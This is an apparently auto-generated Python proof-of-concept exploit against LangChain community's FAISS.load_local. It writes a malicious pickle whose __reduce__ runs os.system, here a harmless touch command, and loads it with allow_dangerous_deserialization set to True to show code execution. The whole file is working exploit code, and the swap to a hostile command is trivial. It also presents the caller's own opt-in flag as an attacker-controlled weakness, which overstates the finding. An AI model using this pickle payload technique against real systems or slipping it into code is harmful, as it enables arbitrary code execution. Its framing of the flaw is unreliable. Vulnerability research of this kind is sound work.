#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_39.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's FAISS.load_local.

Vulnerability: The function load_local uses pickle.load on a file whose path is
constructed from user-controlled folder_path and index_name. Although there is a
guard (allow_dangerous_deserialization) that must be set to True, the guard is a
simple boolean flag that the attacker can set to True. There is no validation of
the file's origin or integrity. An attacker who can control folder_path and
index_name can point to a malicious pickle file, leading to arbitrary code
execution when pickle.load is called.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Calling load_local with attacker-controlled folder_path and index_name pointing to the malicious file
3. Showing that arbitrary code execution is achieved

Usage: python poc_exploit.py
"""

import os
import sys
import pickle
import tempfile
import subprocess

# Add the target library to path
sys.path.insert(0, "/tmp/langchain-community-only")

# Import the vulnerable function
from langchain_community.vectorstores.faiss import FAISS


def create_malicious_pickle(output_path: str) -> None:
    """
    Create a malicious pickle file that executes a benign command.
    
    The pickle will execute: touch /tmp/poc_success.txt
    This is a safe, verifiable command that creates an empty file.
    """
    class MaliciousPickle:
        """Class that executes a command when unpickled."""
        def __reduce__(self):
            # Return a tuple (callable, args) that will be called during unpickling
            return (os.system, ("touch /tmp/poc_success.txt",))
    
    # Create and save the malicious pickle
    malicious_obj = MaliciousPickle()
    with open(output_path, "wb") as f:
        pickle.dump(malicious_obj, f)
    
    print(f"[+] Created malicious pickle file at: {output_path}")


def main():
    """Main exploit demonstration."""
    print("[*] LangChain FAISS load_local RCE PoC")
    print("[*] Vulnerability: pickle.load on attacker-controlled file path")
    print()
    
    # Create a temporary directory for our malicious files
    with tempfile.TemporaryDirectory() as tmpdir:
        print(f"[*] Working in temporary directory: {tmpdir}")
        
        # Create the malicious pickle file
        # The vulnerable function expects a file named {index_name}.pkl
        index_name = "exploit"
        pickle_path = os.path.join(tmpdir, f"{index_name}.pkl")
        create_malicious_pickle(pickle_path)
        
        # Also need a FAISS index file (can be empty/dummy since we only care about pickle)
        # The function also tries to load {index_name}.faiss, but we can provide a dummy
        faiss_path = os.path.join(tmpdir, f"{index_name}.faiss")
        # Create a minimal valid FAISS index file
        try:
            import faiss
            import numpy as np
            # Create a tiny FAISS index
            dimension = 128
            index = faiss.IndexFlatL2(dimension)
            faiss.write_index(index, faiss_path)
            print(f"[+] Created dummy FAISS index at: {faiss_path}")
        except ImportError:
            print("[!] FAISS not installed, creating dummy file instead")
            # Create a dummy file that will fail gracefully
            with open(faiss_path, "wb") as f:
                f.write(b"dummy")
        
        print()
        print("[*] Attempting to trigger RCE via load_local...")
        print(f"[*] folder_path: {tmpdir}")
        print(f"[*] index_name: {index_name}")
        print(f"[*] allow_dangerous_deserialization: True")
        print()
        
        try:
            # Call the vulnerable function with attacker-controlled inputs
            # The function will:
            # 1. Check allow_dangerous_deserialization (we set to True)
            # 2. Open {folder_path}/{index_name}.pkl
            # 3. Call pickle.load() on the file -> executes our malicious payload
            result = FAISS.load_local(
                folder_path=tmpdir,
                embeddings=None,  # Will fail after pickle execution, but that's fine
                index_name=index_name,
                allow_dangerous_deserialization=True
            )
            print(f"[!] Function returned unexpectedly: {result}")
        except Exception as e:
            # The function will likely fail after executing our payload because
            # the embeddings parameter is None, but the command should have run
            print(f"[*] Function raised exception (expected): {type(e).__name__}: {e}")
        
        print()
        
        # Check if the command was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Command executed! File /tmp/poc_success.txt was created.")
            print("[+] This proves arbitrary code execution is possible via pickle.load")
            # Clean up
            os.remove("/tmp/poc_success.txt")
        else:
            print("[-] Command did not execute. Check if the vulnerability is present.")
        
        print()
        print("[*] PoC complete.")


if __name__ == "__main__":
    main()
